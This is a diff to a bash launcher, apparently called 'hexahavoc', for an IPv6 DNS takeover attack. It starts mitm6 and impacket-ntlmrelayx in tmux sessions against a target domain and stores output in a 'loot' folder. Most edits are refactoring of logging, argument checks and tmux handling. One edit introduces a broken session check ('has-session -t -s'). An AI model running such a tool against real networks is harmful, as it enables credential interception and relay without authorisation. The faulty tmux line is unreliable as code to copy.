@@ -23,6 +23,7 @@ verbose=0
 silent=0
 session_name="ipv6_dns_takeover"
 loot_dir="dumps"
+log_file="$loot_dir/hexahavoc_$(date +%F_%H-%M-%S).log"
 
 # Check if a command exists
 check_command() {
@@ -44,12 +45,6 @@ usage() {
   echo -e "  -s  Enable silent mode (suppress console output)"
   exit 1
 }
-
-# Check dependencies
-echo -e "${CYAN}Checking dependencies...${RESET}"
-check_command "tmux"
-check_command "mitm6"
-check_command "impacket-ntlmrelayx"
 
 # Banner function
 banner() {
@@ -80,6 +75,14 @@ while getopts ":d:t:i:l:vs" opt; do
   esac
 done
 
+[[ "$verbose" -eq 1 ]] && set -x
+
+# Check dependencies
+echo -e "${CYAN}Checking dependencies...${RESET}"
+check_command "tmux"
+check_command "mitm6"
+check_command "impacket-ntlmrelayx"
+
 # Ensure required arguments are provided
 if [ -z "$target_domain" ] || [ -z "$target_ip" ]; then
   echo -e "${RED}Error: Both -d (target_domain) and -t (target_ip) arguments are required.${RESET}"
@@ -108,13 +111,18 @@ ping -c 1 -W 2 "$target_ip" &>/dev/null || {
   exit 1
 }
 
+ip link show "$interface" >/dev/null 2>&1 || {
+  echo -e "${RED}Invalid interface: $interface${RESET}"
+  exit 1
+}
+
 cleanup() {
-  if [[ $? -ne 0 ]]; then
+  local exit_code=$?
+  if [[ $exit_code -ne 0 ]]; then
     echo -e "${YELLOW}Cleaning up session...${RESET}"
     tmux kill-session -t "$session_name" 2>/dev/null || true
   fi
 }
-
 trap cleanup EXIT
 
 # Root privilege check
@@ -124,17 +132,14 @@ if [ "$EUID" -ne 0 ]; then
 fi
 
 # Create loot directory if it doesn't exist
-if [ ! -d "$loot_dir" ]; then
-  mkdir -p "$loot_dir"
-else
-  echo -e "${YELLOW}Warning: Loot directory '$loot_dir' already exists. Results may be overwritten.${RESET}"
-fi
+mkdir -p "$loot_dir"
 
 # Suppress console output if silent mode is enabled
-log_file="$loot_dir/hexahavoc_$(date +%F_%H-%M-%S).log"
-
-exec > >(tee -a "$log_file") 2>&1
-[[ "$silent" -eq 1 ]] && exec >/dev/null
+if [[ "$silent" -eq 1 ]]; then
+  exec >"$log_file" 2>&1
+else
+  exec > >(tee -a "$log_file") 2>&1
+fi
 
 # Show the banner
 banner
@@ -146,7 +151,7 @@ if [ "$verbose" -eq 1 ] && [ "$silent" -eq 1 ]; then
 fi
 
 # Check if tmux session exists
-if tmux has-session -t "$session_name" 2>/dev/null; then
+if tmux has-session -t -s "$session_name" 2>/dev/null; then
   echo -e "${YELLOW}[!] Tmux session '${session_name}' already exists.${RESET}"
 
   echo -e "${BLUE}Do you want to:${RESET}"
@@ -157,7 +162,7 @@ if tmux has-session -t "$session_name" 2>/dev/null; then
   case "$user_choice" in
     [aA])
       echo -e "${GREEN}[*] Attaching to existing tmux session...${RESET}"
-      tmux -CC attach-session -t "$session_name"
+      tmux attach-session -t "$session_name"
       exit 0
       ;;
     [kK])
@@ -182,11 +187,13 @@ start_tmux_window() {
   local session_name=$1
   local window_name=$2
   local command=$3
+  
   tmux new-window -t "$session_name" -n "$window_name" || {
     echo "Failed to create window"
     exit 1
   }
-  tmux send-keys -t "$session_name:$window_name" "bash -lc \"$command\"" C-m
+  tmux send-keys -t "$session_name:$window_name" \
+    "bash -lc $(printf '%q' "$command")" C-m
 }
 
 # Start mitm6 in tmux session
@@ -205,7 +212,7 @@ start_tmux_window "$session_name" "impacket-ntlmrelayx" "impacket-ntlmrelayx -6 
 
 # Attach to the tmux session
 echo -e "${GREEN}Attaching to the tmux session '$session_name'...${RESET}"
-tmux -CC attach-session -t "$session_name"
+tmux attach-session -t "$session_name"
 
 # Disable verbose logging
 if [ "$verbose" -eq 1 ]; then
